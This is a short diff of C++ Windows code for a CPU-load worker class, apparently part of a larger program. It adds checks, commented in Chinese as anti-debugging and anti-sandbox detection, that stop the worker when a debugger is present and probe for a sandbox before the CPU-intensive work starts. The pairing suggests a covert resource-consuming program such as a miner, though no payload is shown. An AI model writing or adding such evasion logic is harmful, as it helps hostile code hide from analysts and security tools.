@@ -7,7 +7,7 @@
 #endif
 
 CPUWorker::CPUWorker(int thresh)
-    : threshold(thresh), running(0), intensity(30), lastAdjustTime(0) {
+    : running(0), intensity(30), lastAdjustTime(0) {
     
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
@@ -32,6 +32,15 @@ CPUWorker::~CPUWorker() {
 
 void CPUWorker::Start() {
     if (InterlockedCompareExchange(&running, 1, 0) != 0) return;
+    
+    // 反调试检测
+    if (IsDebuggerPresent_Safe()) {
+        InterlockedExchange(&running, 0);
+        return;
+    }
+    
+    // 反沙箱检测
+    AntiSandboxMemoryPattern();
     
     InterlockedExchange(&intensity, 30);
     lastAdjustTime = GetTickCount();
